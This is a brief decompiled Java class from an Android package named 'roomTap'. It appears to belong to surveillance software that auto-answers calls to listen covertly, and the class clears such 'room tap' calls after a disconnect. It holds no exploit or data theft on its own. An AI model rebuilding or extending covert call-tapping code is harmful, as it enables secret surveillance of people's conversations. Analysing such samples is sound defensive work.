package com.network.android.roomTap;

import com.network.android.c.a.a;

final class b implements Runnable {

    /* renamed from: a  reason: collision with root package name */
    final /* synthetic */ a f115a;

    b(a aVar) {
        this.f115a = aVar;
    }

    public final void run() {
        a.a("AutoAnswerReceiver onRecieve removing room tap calls after disconnect");
        AutoAnswerReceiver.f(this.f115a.b);
    }
}
